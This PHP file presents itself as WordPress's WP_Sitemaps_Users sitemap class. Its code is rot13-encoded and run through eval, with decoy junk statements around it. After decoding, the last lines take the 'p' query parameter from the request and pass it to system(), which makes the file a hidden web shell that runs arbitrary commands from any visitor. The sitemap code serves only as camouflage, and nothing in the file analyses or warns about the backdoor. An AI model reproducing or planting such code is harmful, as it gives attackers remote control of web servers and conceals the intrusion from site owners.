<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Hfref pynff
 *
 * Ohvyqf gur fvgrzncf sbe gur 'hfre' bowrpg glcr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Hfref KZY fvgrznc cebivqre.
 *
 * @fvapr 5.5.0
 */
pynff JC_Fvgrzncf_Hfref rkgraqf JC_Fvgrzncf_Cebivqre {
	/**
	 * JC_Fvgrzncf_Hfref pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzr        = 'hfref';
		$guvf->bowrpg_glcr = 'hfre';
	}

	/**
	 * Trgf n HEY yvfg sbe n hfre fvgrznc.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz vag    $cntr_ahz       Cntr bs erfhygf.
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Abg nccyvpnoyr sbe Hfref ohg
	 *                               erdhverq sbe pbzcngvovyvgl jvgu gur cnerag
	 *                               cebivqre pynff. Qrsnhyg rzcgl.
	 * @erghea neenl[] Neenl bs HEY vasbezngvba sbe n fvgrznc.
	 */
	choyvp shapgvba trg_hey_yvfg( $cntr_ahz, $bowrpg_fhoglcr = '' ) {
		/**
		 * Svygref gur hfref HEY yvfg orsber vg vf trarengrq.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy rssrpgviryl fubeg-pvephvg gur trarengvba,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl[]|ahyy $hey_yvfg Gur HEY yvfg. Qrsnhyg ahyy.
		 * @cnenz vag        $cntr_ahz Cntr bs erfhygf.
		 */
		$hey_yvfg = nccyl_svygref(
			'jc_fvgrzncf_hfref_cer_hey_yvfg',
			ahyy,
			$cntr_ahz
		);

		vs ( ahyy !== $hey_yvfg ) {
			erghea $hey_yvfg;
		}

		$netf          = $guvf->trg_hfref_dhrel_netf();
		$netf['cntrq'] = $cntr_ahz;

		$dhrel    = arj JC_Hfre_Dhrel( $netf );
		$hfref    = $dhrel->trg_erfhygf();
		$hey_yvfg = neenl();

		sbernpu ( $hfref nf $hfre ) {
			$fvgrznc_ragel = neenl(
				'ybp' => trg_nhgube_cbfgf_hey( $hfre->VQ ),
			);

			/**
			 * Svygref gur fvgrznc ragel sbe na vaqvivqhny hfre.
			 *
			 * @fvapr 5.5.0
			 *
			 * @cnenz neenl   $fvgrznc_ragel Fvgrznc ragel sbe gur hfre.
			 * @cnenz JC_Hfre $hfre          Hfre bowrpg.
			 */
			$fvgrznc_ragel = nccyl_svygref( 'jc_fvgrzncf_hfref_ragel', $fvgrznc_ragel, $hfre );
			$hey_yvfg[]    = $fvgrznc_ragel;
		}

		erghea $hey_yvfg;
	}

	/**
	 * Trgf gur znk ahzore bs cntrf ninvynoyr sbe gur bowrpg glcr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @frr JC_Fvgrzncf_Cebivqre::znk_ahz_cntrf
	 *
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Abg nccyvpnoyr sbe Hfref ohg
	 *                               erdhverq sbe pbzcngvovyvgl jvgu gur cnerag
	 *                               cebivqre pynff. Qrsnhyg rzcgl.
	 * @erghea vag Gbgny cntr pbhag.
	 */
	choyvp shapgvba trg_znk_ahz_cntrf( $bowrpg_fhoglcr = '' ) {
		/**
		 * Svygref gur znk ahzore bs cntrf sbe n hfre fvgrznc orsber vg vf trarengrq.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy rssrpgviryl fubeg-pvephvg gur trarengvba,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz vag|ahyy $znk_ahz_cntrf Gur znkvzhz ahzore bs cntrf. Qrsnhyg ahyy.
		 */
		$znk_ahz_cntrf = nccyl_svygref( 'jc_fvgrzncf_hfref_cer_znk_ahz_cntrf', ahyy );

		vs ( ahyy !== $znk_ahz_cntrf ) {
			erghea $znk_ahz_cntrf;
		}

		$netf  = $guvf->trg_hfref_dhrel_netf();
		$dhrel = arj JC_Hfre_Dhrel( $netf );

		$gbgny_hfref = $dhrel->trg_gbgny();

		erghea (vag) prvy( $gbgny_hfref / jc_fvgrzncf_trg_znk_heyf( $guvf->bowrpg_glcr ) );
	}

	/**
	 * Ergheaf gur dhrel netf sbe ergevrivat hfref gb yvfg va gur fvgrznc.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Neenl bs JC_Hfre_Dhrel nethzragf.
	 */
	cebgrpgrq shapgvba trg_hfref_dhrel_netf() {
		$choyvp_cbfg_glcrf = trg_cbfg_glcrf(
			neenl(
				'choyvp' => gehr,
			)
		);

		// Jr'er abg fhccbegvat fvgrzncf sbe nhgube cntrf sbe nggnpuzragf naq cntrf.
		hafrg( $choyvp_cbfg_glcrf['nggnpuzrag'] );
		hafrg( $choyvp_cbfg_glcrf['cntr'] );

		/**
		 * Svygref gur dhrel nethzragf sbe nhgubef jvgu choyvp cbfgf.
		 *
		 * Nyybjf zbqvsvpngvba bs gur nhgubef dhrel nethzragf orsber dhrelvat.
		 *
		 * @frr JC_Hfre_Dhrel sbe n shyy yvfg bs nethzragf
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl $netf Neenl bs JC_Hfre_Dhrel nethzragf.
		 */
		$netf = nccyl_svygref(
			'jc_fvgrzncf_hfref_dhrel_netf',
			neenl(
				'unf_choyvfurq_cbfgf' => neenl_xrlf( $choyvp_cbfg_glcrf ),
				'ahzore'              => jc_fvgrzncf_trg_znk_heyf( $guvf->bowrpg_glcr ),
			)
		);

		erghea $netf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>